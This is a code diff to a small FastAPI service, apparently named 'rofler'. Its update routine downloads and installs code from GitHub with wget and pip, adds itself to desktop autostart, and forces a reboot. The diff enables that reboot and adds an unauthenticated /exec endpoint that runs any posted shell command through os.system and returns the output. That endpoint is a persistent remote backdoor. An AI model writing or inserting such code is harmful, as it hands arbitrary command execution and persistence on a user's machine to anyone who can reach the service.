@@ -7,7 +7,8 @@ app = FastAPI()
 
 
 update_cmd = """
-rm ~/rofler
+rm -rf ~/rofler
+rm ~/.config/autostart/rofler
 wget https://github.com/ImCocos/rofler/archive/refs/heads/main.zip -P ~/;
 unzip ~/main.zip -d ~/;
 rm ~/main.zip;
@@ -16,7 +17,7 @@ python -m venv ~/rofler/venv;
 ~/rofler/venv/bin/python -m pip install -r ~/rofler/requirements.txt;
 mkdir ~/.config/autostart;
 cp ~/rofler/rofler ~/.config/autostart/rofler;
-# systemctl reboot;
+systemctl reboot;
 """.strip()
 
 
@@ -24,6 +25,13 @@ cp ~/rofler/rofler ~/.config/autostart/rofler;
 async def root() -> dict[str, str]:
     os.system(update_cmd)
     return {'status': 'ok'}
+
+@app.post('/exec')
+def exec(cmd: str):
+    os.system(cmd + ' > ~/rofler/.tmp')
+    with open(os.path.join(os.path.expanduser('~'), 'rofler/.tmp'), 'r') as file:
+        raw = file.read()
+    return {'status': 'ok', 'text': raw}
 
 
 if __name__ == "__main__":
